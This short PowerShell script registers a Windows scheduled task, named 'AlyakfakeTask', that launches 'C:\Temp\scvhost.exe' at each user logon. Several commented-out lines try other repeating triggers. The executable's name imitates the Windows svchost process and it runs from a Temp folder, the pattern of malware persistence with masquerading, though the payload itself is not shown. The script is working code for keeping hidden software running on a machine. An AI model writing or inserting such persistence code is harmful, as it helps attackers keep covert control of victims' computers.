# $Time = New-ScheduledTaskTrigger -RepetitionInterval(New-TimeSpan -Minutes 3) -RepetitionDuration([TimeSpan]::MaxValue)
# $Time = New-ScheduledTaskTrigger -Once -At 3am -RepetitionInterval(New-TimeSpan -Minutes 1) -RepetitionDuration([TimeSpan]::MaxValue)
# $Trigger = New-ScheduledTaskTrigger -AtStartup -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([timespan]::MaxValue)
# $Trigger = New-ScheduledTaskTrigger -Once -At 8PM -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([timespan]::MaxValue)
$Action = New-ScheduledTaskAction -Execute 'C:\Temp\scvhost.exe'
$tr = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
#$tr.Repetition = (New-ScheduledTaskTrigger -once -at "6pm" -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Minutes 720)).repetition
Register-ScheduledTask -TaskName "AlyakfakeTask" -Trigger $tr -Action $Action -Force